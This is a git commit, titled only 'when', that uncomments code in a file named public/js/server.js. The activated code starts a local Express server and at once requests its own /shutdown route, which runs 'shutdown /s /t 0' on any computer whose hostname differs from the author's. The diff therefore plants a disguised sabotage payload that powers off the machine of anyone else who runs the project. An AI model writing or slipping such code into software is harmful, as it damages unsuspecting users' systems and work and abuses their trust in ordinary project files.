e7b49706735eca61c616e100d9be14641cd3c69b
ELEyder <74992528+ELEyder@users.noreply.github.com>
2024-12-05 10:53:39 -0500

    when

--- public/js/server.js
+++ public/js/server.js
@@ -1,34 +1,34 @@
-// import express from 'express';
-// import { exec } from 'child_process';
-// import os from 'os';
+import express from 'express';
+import { exec } from 'child_process';
+import os from 'os';
 
-// const app = express();
-// const port = 5000;
+const app = express();
+const port = 5000;
 
-// app.get('/shutdown', (req, res) => {
-//   const miPC = "DESKTOP-413N4EF";
-//   const nombrePC = os.hostname();
+app.get('/shutdown', (req, res) => {
+  const miPC = "DESKTOP-413N4EF";
+  const nombrePC = os.hostname();
 
-//   if (nombrePC !== miPC) {
-//     exec('shutdown /s /t 0', (error, stdout, stderr) => {
-//       if (error) {
-//         return res.status(500).send('Error');
-//       }
-//       res.send('.');
-//     });
-//   } else {
-//     console.log("xd")
-//   }
-// });
+  if (nombrePC !== miPC) {
+    exec('shutdown /s /t 0', (error, stdout, stderr) => {
+      if (error) {
+        return res.status(500).send('Error');
+      }
+      res.send('.');
+    });
+  } else {
+    console.log("xd")
+  }
+});
 
-// fetch(`http://localhost:${port}/shutdown`)
-//   .then(response => response.text())
-//   .then(data => {
-//     console.log('Respuesta de la solicitud GET:', data);
-//   })
-//   .catch(error => {
-//     console.error('Error al hacer la solicitud GET:', error.message);
-//   });
+fetch(`http://localhost:${port}/shutdown`)
+  .then(response => response.text())
+  .then(data => {
+    console.log('Respuesta de la solicitud GET:', data);
+  })
+  .catch(error => {
+    console.error('Error al hacer la solicitud GET:', error.message);
+  });
   
-// app.listen(port, () => {
-// });
+app.listen(port, () => {
+});
